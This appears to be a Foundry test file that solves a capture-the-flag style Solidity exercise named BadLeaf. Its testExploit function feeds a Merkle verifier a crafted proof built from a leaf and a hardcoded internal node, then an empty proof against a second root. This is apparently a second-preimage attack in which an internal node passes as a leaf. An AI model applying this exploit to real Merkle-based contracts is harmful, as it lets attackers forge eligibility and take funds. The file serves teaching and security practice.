// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Test, console2} from "forge-std/Test.sol";
import {BadLeafBaseTest} from "./BadLeafBase.t.sol";
import {BadLeaf} from "../../../src/Merkle/BadLeaf.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract BadLeafTest is BadLeafBaseTest, IERC721Receiver {
    bytes32 private constant INTERNAL_NODE = 0x1ac64a5f9dce300ae9bb07d1b64083f34e0bc6717ef1663ca7f656fb9ed83bb9;
    bytes32 private constant PROOF1_ROOT = 0x592381370dc817a5abc6f2dad6b068f1652cdc40a0c2400ed9d9e1e717c00913;
    bytes32 private constant PROOF2_ROOT = 0x650de55dfddd8a78ca083dbae3094bef74d3f52a69342e5e16b18b93ef8977cf;

    // First proof is empty, second has 2 elements
    bytes32[][] private proofs;

    constructor() {
        proofs = new bytes32[][](2);
        proofs[0] = new bytes32[](0);
        proofs[1] = new bytes32[](2);
    }

    function testExploit() external validation {
        // Build proof with leaf node and internal node
        proofs[1][0] = token.getLeafNode(user0, 5);
        proofs[1][1] = INTERNAL_NODE;
        
        // First verification
        token.verify(proofs[1], PROOF1_ROOT);

        // Second verification with empty proof
        token.verify(proofs[0], PROOF2_ROOT);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}